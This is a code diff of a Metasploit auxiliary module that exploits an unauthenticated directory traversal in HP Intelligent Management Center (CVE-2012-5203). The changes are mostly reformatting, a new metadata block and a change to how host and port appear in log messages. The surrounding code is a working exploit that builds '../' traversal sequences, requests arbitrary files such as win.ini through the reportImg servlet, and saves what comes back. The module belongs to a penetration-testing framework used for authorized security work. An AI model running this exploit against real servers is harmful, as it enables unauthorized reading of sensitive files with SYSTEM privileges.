@@ -9,28 +9,34 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'HP Intelligent Management ReportImgServlt Directory Traversal',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'HP Intelligent Management ReportImgServlt Directory Traversal',
+        'Description' => %q{
           This module exploits a lack of authentication and a directory traversal in HP
-        Intelligent Management, specifically in the ReportImgServlt, in order to retrieve
-        arbitrary files with SYSTEM privileges. This module has been tested successfully on
-        HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          Intelligent Management, specifically in the ReportImgServlt, in order to retrieve
+          arbitrary files with SYSTEM privileges. This module has been tested successfully on
+          HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2012-5203' ],
           [ 'OSVDB', '91028' ],
           [ 'BID', '58672' ],
           [ 'ZDI', '13-052' ]
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -39,12 +45,13 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
         # By default files downloaded from C:\Program Files\iMC\client\bin\
         OptInt.new('DEPTH', [true, 'Traversal depth', 4])
-      ])
+      ]
+    )
   end
 
   def is_imc?
     res = send_request_cgi({
-      'uri'    => normalize_uri(target_uri.path.to_s, "login.jsf"),
+      'uri' => normalize_uri(target_uri.path.to_s, "login.jsf"),
       'method' => 'GET'
     })
 
@@ -60,9 +67,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     if not is_imc?
-      vprint_error("#{rhost}:#{rport} - This isn't a HP Intelligent Management Center")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - This isn't a HP Intelligent Management Center")
       return
     end
 
@@ -70,11 +76,11 @@ class MetasploitModule < Msf::Auxiliary
     travs << "../" * datastore['DEPTH']
     travs << datastore['FILEPATH']
 
-    vprint_status("#{rhost}:#{rport} - Sending request...")
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request...")
     res = send_request_cgi({
-      'uri'          => normalize_uri(target_uri.path.to_s, "reportImg"),
-      'method'       => 'GET',
-      'vars_get'     =>
+      'uri' => normalize_uri(target_uri.path.to_s, "reportImg"),
+      'method' => 'GET',
+      'vars_get' =>
         {
           'path' => travs
         }
@@ -90,9 +96,9 @@ class MetasploitModule < Msf::Auxiliary
         contents,
         fname
       )
-      print_good("#{rhost}:#{rport} - File saved in: #{path}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
     else
-      vprint_error("#{rhost}:#{rport} - Failed to retrieve file")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve file")
       return
     end
   end
